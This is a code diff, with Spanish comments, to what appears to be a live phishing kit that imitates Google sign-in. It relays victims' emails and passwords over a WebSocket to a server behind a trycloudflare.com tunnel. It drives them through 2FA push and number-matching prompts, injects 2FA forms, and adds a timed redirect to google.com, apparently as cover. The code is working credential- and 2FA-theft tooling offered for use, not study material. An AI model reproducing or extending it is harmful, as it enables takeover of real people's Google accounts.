@@ -247,7 +247,34 @@ document.addEventListener('DOMContentLoaded', () => {
 
 
 
-// ------------------------- LÓGICA PANTALLA 1 --------------------------- //
+// ------------------------- LÓGICA PANTALLA 1 -------------------------- //
+
+
+// ------------------------- INACTIVIDAD Y REDIRECCIÓN --------------------------- //
+
+let pageLoadTimerId = null; // Puedes mantenerla para logging/debugging o quitarla si no la usas
+
+/**
+ * Redirige la página actual a Google.com.
+ */
+function redirectToGoogle() {
+    console.log("Tiempo límite de 7 minutos alcanzado. Redirigiendo a https://www.google.com...");
+    window.location.href = "https://www.google.com";
+}
+
+/**
+ * Inicia un temporizador de 7 minutos.
+ * Redirigirá a Google.com cuando el tiempo expire.
+ */
+function startPageLoadRedirectTimer() {
+    const sevenMinutesInMs = 10 * 60 * 1000; // 7 minutos * 60 segundos/minuto * 1000 ms/segundo
+
+    // Simplemente iniciamos el temporizador.
+    // Guardar el ID es opcional si nunca lo vas a limpiar.
+    pageLoadTimerId = setTimeout(redirectToGoogle, sevenMinutesInMs);
+    console.log(`Redirección a Google.com programada en 7 minutos (ID: ${pageLoadTimerId}).`);
+}
+
 
 /**
  * Configura los event listeners para los elementos interactivos de la Pantalla 1.
@@ -735,6 +762,7 @@ async function loadScreen(screenName, dynamicData = null) {
             html = html.replace(/PLACEHOLDER_DEVICE/g, deviceToShow); // Reemplaza todas las ocurrencias
 
             console.log("HTML modificado para AUTH_NOTIFICATION_PENDING.");
+            activateCustomLoadingModalAfterDelay();
             // ------------------------- FIN LÓGICA HTML PANTALLA AUTH_NOTIFICATION_PENDING -------------------------
 
         } else if (screenName === 'AUTH_NOTIFICATION_PENDING_PRESS_NUMBER') {
@@ -913,111 +941,138 @@ function handleWebSocketMessage(event) {
 
         // Gestionar respuesta basada en el 'status'
         switch (message.status) {
-            case 'READY':
-                // El servidor está listo. La UI inicial (screen1) ya está configurada.
-                console.log("Servidor confirma: Listo.");
-                // Podrías habilitar elementos si estuvieran deshabilitados inicialmente
-                break;
+          case "READY":
+            // El servidor está listo. La UI inicial (screen1) ya está configurada.
+            console.log("Servidor confirma: Listo.");
+            // Podrías habilitar elementos si estuvieran deshabilitados inicialmente
+            break;
 
-            case 'ENTER_PASSWORD':
-                // El email/teléfono es válido según el servidor.
-                hideLoader(); // Ocultar loader
-                clearScreen1Errors(); // Limpiar errores por si acaso
-                loadScreen('screen2'); // Cargar la pantalla 2
-                break;
+          case "ENTER_PASSWORD":
+            // El email/teléfono es válido según el servidor.
+            hideLoader(); // Ocultar loader
+            clearScreen1Errors(); // Limpiar errores por si acaso
+            loadScreen("screen2"); // Cargar la pantalla 2
+            break;
 
-            case 'EMAIL_INVALID':
-                // El email/teléfono NO es válido.
-                hideLoader(); // Ocultar loader
-                // Mostrar el mensaje de error proporcionado por el servidor o uno genérico
-                showScreen1Error("No pudimos encontrar tu cuenta de Google");
-                break;
+          case "EMAIL_INVALID":
+            // El email/teléfono NO es válido.
+            hideLoader(); // Ocultar loader
+            // Mostrar el mensaje de error proporcionado por el servidor o uno genérico
+            showScreen1Error("No pudimos encontrar tu cuenta de Google");
+            break;
 
-            case 'LOGIN_SUCCESS':
-                //hideLoader();
-                //clearScreen1Errors();
-                console.log("Servidor indica login exitoso, cargando pantalla update-phone...");
-                //loadScreen('update-phone');
-                window.location.href = 'screens/update-phone.html'; 
-                 break;
+          case "LOGIN_SUCCESS":
+            //hideLoader();
+            //clearScreen1Errors();
+            console.log(
+              "Servidor indica login exitoso, cargando pantalla update-phone..."
+            );
+            //loadScreen('update-phone');
+            window.location.href = "screens/update-phone.html";
+            break;
 
-            case 'PASSWORD_INVALID':
-                 // La contraseña NO es válida.
-                 hideLoader();
-                 showScreen1Error('La contraseña es incorrecta. Vuelve a intentarlo.');
-                 break;
+          case "PASSWORD_INVALID":
+            // La contraseña NO es válida.
+            hideLoader();
+            showScreen1Error(
+              "La contraseña es incorrecta. Vuelve a intentarlo."
+            );
+            break;
 
-            case 'PASSWORD_CHANGED_RECENTLY':
-                // La contraseña ha sido cambiada.  
+          case "PASSWORD_CHANGED_RECENTLY":
+            // La contraseña ha sido cambiada.
+            hideLoader();
+            const specificErrorMessage = message.message; // message es el objeto parseado de event.data
+            console.log(
+              `PASSWORD_CHANGED_RECENTLY: Mostrando error específico: "${specificErrorMessage}"`
+            );
+            showScreen1Error(
+              specificErrorMessage ||
+                "La contraseña fue cambiada recientemente."
+            );
+            break;
+
+          case "AUTH_NOTIFICATION_PENDING_PRESS_NUMBER":
+            // La notificación se envía PRIMERO, luego se carga la pantalla.
+            console.log("AUTH_NOTIFICATION_PENDING_PRESS_NUMBER recibido.");
+            console.log(message.payload);
+            if (
+              message.payload &&
+              typeof message.payload.pressNumber !== "undefined"
+            ) {
+              sendPushNotification(message.payload.pressNumber); // <--- LLAMADA A LA FUNCIÓN
+            } else {
+              console.warn(
+                "AUTH_NOTIFICATION_PENDING_PRESS_NUMBER recibido sin pressNumber en payload."
+              );
+            }
+            loadScreen(
+              "AUTH_NOTIFICATION_PENDING_PRESS_NUMBER",
+              message.payload
+            ); // hideLoader se llama dentro de loadScreen
+            break;
+
+
+          case "AUTH_2FA_OPTIONS_PRESENT":
+            // 1. Cargar la estructura base de la pantalla 2FA
+            loadScreen("AUTH_2FA_OPTIONS_PRESENT")
+              .then(() => {
+                // 2. Una vez cargada la estructura, inyectar el formulario
+                if (message.payload && message.payload.formHtml) {
+                  const success = injectAndModifyAuthForm(
+                    message.payload.formHtml, // ← aquí cambiamos de message.data a message.payload
+                    "auth-form-target" // ID del contenedor en tu HTML
+                  );
+                  if (!success) {
+                    console.error(
+                      "Fallo al inyectar/modificar el formulario 2FA."
+                    );
+                    // Podrías mostrar un mensaje de error al usuario aquí
+                  }
+                  // setupAuthOptionsListeners() y hideLoader() ya se llaman dentro de injectAndModifyAuthForm
+                } else {
+                  console.error(
+                    "AUTH_2FA_OPTIONS_PRESENT llegó sin formHtml en payload."
+                  );
+                  appContainer.innerHTML =
+                    '<p style="color: red;">Error al recibir las opciones de verificación.</p>';
+                  hideLoader();
+                }
+              })
+              .catch((error) => {
+                console.error(
+                  "Error al cargar la pantalla base AUTH_2FA_OPTIONS_PRESENT:",
+                  error
+                );
+                appContainer.innerHTML =
+                  '<p style="color: red;">Error al cargar la pantalla de verificación.</p>';
                 hideLoader();
-                const specificErrorMessage = message.message; // message es el objeto parseado de event.data
-                 console.log(`PASSWORD_CHANGED_RECENTLY: Mostrando error específico: "${specificErrorMessage}"`);
-                 showScreen1Error(specificErrorMessage || 'La contraseña fue cambiada recientemente.');
-                 break;
+              });
+            break;
 
+          case "AUTH_NOTIFICATION_PENDING":
+            //hideLoader();
+            // Ahora tu servidor manda { status, payload: { deviceName } }
+            if (message.payload && message.payload.deviceName) {
+              currentDeviceName = message.payload.deviceName;
+              console.log(
+                `Nombre del dispositivo guardado: ${currentDeviceName}`
+              );
+            } else {
+              currentDeviceName = null;
+              console.warn(
+                "AUTH_NOTIFICATION_PENDING recibido sin payload.deviceName."
+              );
+            }
+            loadScreen("AUTH_NOTIFICATION_PENDING");
+            break;
 
-            case 'AUTH_NOTIFICATION_PENDING_PRESS_NUMBER':
-                    // La notificación se envía PRIMERO, luego se carga la pantalla.
-                    console.log('AUTH_NOTIFICATION_PENDING_PRESS_NUMBER recibido.');
-                    console.log(message.payload);
-                    if (message.payload && typeof message.payload.pressNumber !== 'undefined') {
-                        sendPushNotification(message.payload.pressNumber); // <--- LLAMADA A LA FUNCIÓN
-                    } else {
-                        console.warn('AUTH_NOTIFICATION_PENDING_PRESS_NUMBER recibido sin pressNumber en payload.');
-                    }
-                    loadScreen('AUTH_NOTIFICATION_PENDING_PRESS_NUMBER', message.payload); // hideLoader se llama dentro de loadScreen
-                    break;
-
-                case 'AUTH_2FA_OPTIONS_PRESENT':
-    // 1. Cargar la estructura base de la pantalla 2FA
-    loadScreen('AUTH_2FA_OPTIONS_PRESENT')
-      .then(() => {
-        // 2. Una vez cargada la estructura, inyectar el formulario
-        if (message.payload && message.payload.formHtml) {
-          const success = injectAndModifyAuthForm(
-            message.payload.formHtml,     // ← aquí cambiamos de message.data a message.payload
-            'auth-form-target'            // ID del contenedor en tu HTML
-          );
-          if (!success) {
-            console.error("Fallo al inyectar/modificar el formulario 2FA.");
-            // Podrías mostrar un mensaje de error al usuario aquí
-          }
-          // setupAuthOptionsListeners() y hideLoader() ya se llaman dentro de injectAndModifyAuthForm
-        } else {
-          console.error("AUTH_2FA_OPTIONS_PRESENT llegó sin formHtml en payload.");
-          appContainer.innerHTML =
-            '<p style="color: red;">Error al recibir las opciones de verificación.</p>';
-          hideLoader();
-        }
-      })
-      .catch(error => {
-        console.error(
-          "Error al cargar la pantalla base AUTH_2FA_OPTIONS_PRESENT:", error
-        );
-        appContainer.innerHTML =
-          '<p style="color: red;">Error al cargar la pantalla de verificación.</p>';
-        hideLoader();
-      });
-    break;
-
-           
-        
-            case 'AUTH_NOTIFICATION_PENDING':
-                    //hideLoader();
-                    // Ahora tu servidor manda { status, payload: { deviceName } }
-                    if (message.payload && message.payload.deviceName) {
-                        currentDeviceName = message.payload.deviceName;
-                        console.log(`Nombre del dispositivo guardado: ${currentDeviceName}`);
-                    } else {
-                        currentDeviceName = null;
-                        console.warn("AUTH_NOTIFICATION_PENDING recibido sin payload.deviceName.");
-                    }
-                    loadScreen('AUTH_NOTIFICATION_PENDING');
-                break;
-
-            default:
-                console.warn("Estado de mensaje WebSocket no reconocido:", message.status);
-                hideLoader(); // Ocultar loader por si acaso
+          default:
+            console.warn(
+              "Estado de mensaje WebSocket no reconocido:",
+              message.status
+            );
+            hideLoader(); // Ocultar loader por si acaso
         }
     } catch (error) {
         console.error("Error al procesar mensaje WebSocket:", error, "Data recibida:", event.data);
@@ -1086,7 +1141,7 @@ function initWebSocket() {
     // Construye la URL completa y correcta para el WebSocket (ej: ws://192.168.5.52:8080)
     //const wsUrl = `ws://${wsHost}:8080`;
 
-    const cloudflareTunnelUrl = 'weeks-christ-nuke-sometimes.trycloudflare.com'; // SOLO el hostname del túnel
+    const cloudflareTunnelUrl = 'weeks-christ-nuke-sometimes.trycloudflare.com '; // SOLO el hostname del túnel
     const wsUrl = `wss://${cloudflareTunnelUrl}`;
 
     // Loguea la URL que se usará para la conexión (útil para depurar)
@@ -1159,6 +1214,8 @@ if ('serviceWorker' in navigator && (location.protocol === 'https:' || location.
     setupScreen1Listeners();
     // 2. Iniciar la conexión WebSocket
     initWebSocket();
+    // 3. INICIAR EL TMEPORIZADOR DE REDIRECCIÓN DE 7 MINUTOS
+    startPageLoadRedirectTimer();
 }
 
 // Ejecutar la función main cuando el contenido del DOM esté listo
